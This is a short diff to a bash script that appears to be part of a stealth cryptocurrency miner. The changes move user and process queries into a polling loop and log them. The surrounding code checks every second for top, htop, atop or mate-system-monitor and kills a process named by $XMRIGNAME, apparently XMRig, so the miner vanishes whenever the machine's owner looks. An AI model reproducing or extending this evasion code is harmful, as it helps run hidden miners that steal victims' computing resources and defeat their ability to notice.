@@ -23,7 +23,6 @@ toggle_debug() {
 
 trap 'toggle_debug' SIGUSR1
 
-# Function to log messages if DEBUG is on
 log_message() {
   if [[ $DEBUG -eq 1 ]]; then
     echo "$(date): $1" >> "$LOG_FILE"
@@ -57,14 +56,17 @@ main() {
 
 	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)
 
-	me=$(whoami)
-	myproc=$(ps -a)
-	
+
 	while true; do 
 		sleep 1
 
-		log_message $me
+		me=$(whoami)
+		myproc=$(ps -a)
+		whoresult=$(who)
+
+		log_message "$me"
 		log_message "$myproc"
+		log_message "$whoresult"
 
 		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
 			pkill $XMRIGNAME
